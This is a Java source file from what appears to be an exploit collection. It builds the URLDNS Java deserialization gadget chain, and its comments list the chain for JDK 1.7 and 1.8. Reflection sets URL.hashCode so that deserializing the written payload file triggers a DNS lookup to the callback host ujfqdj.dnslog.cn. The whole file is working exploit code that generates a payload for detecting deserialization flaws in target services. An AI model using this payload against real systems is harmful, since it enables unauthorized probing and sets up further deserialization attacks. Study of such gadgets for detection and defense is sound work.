package com.sec.exploits.URLDNS;

import com.sec.annotation.Dependencies;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-11 15:24
 **/

/**
 * 1.8
 * Gadget Chain:
 *   HashMap.readObject()
 *     HashMap.putVal()
 *      HashMap.hash()
 *          URL.hashCode
 *          URLStreamHandler.hashCode
 *          URLStreamHandler.getHostAddress
 *
 *  1.7
 *  Gadget Chain:
 *      HashMap.readObject()
 *        HashMap.putForCreate()
 *          HashMap.hash()
 *            URL.hashCode()
 *            URLStreamHandler.hashCode
 *            URLStreamHandler.getHostAddress
 */

@Dependencies("JDK_Original")
public class Exploit {
    public static void main(String[] args) throws Exception{
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        URL url = new URL("http://ujfqdj.dnslog.cn");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);

        f.set(url, 123); //任何不是-1的值都可以
        hashMap.put(url, "999");//由于不是-1，所以不会触发put引发的dns查询
        f.set(url, -1);//再改回-1，为了在反序列化操作时可以触发

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_urldns.ser")));
        oos.writeObject(hashMap);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_urldns.ser")));
        ois.readObject();
    }
}
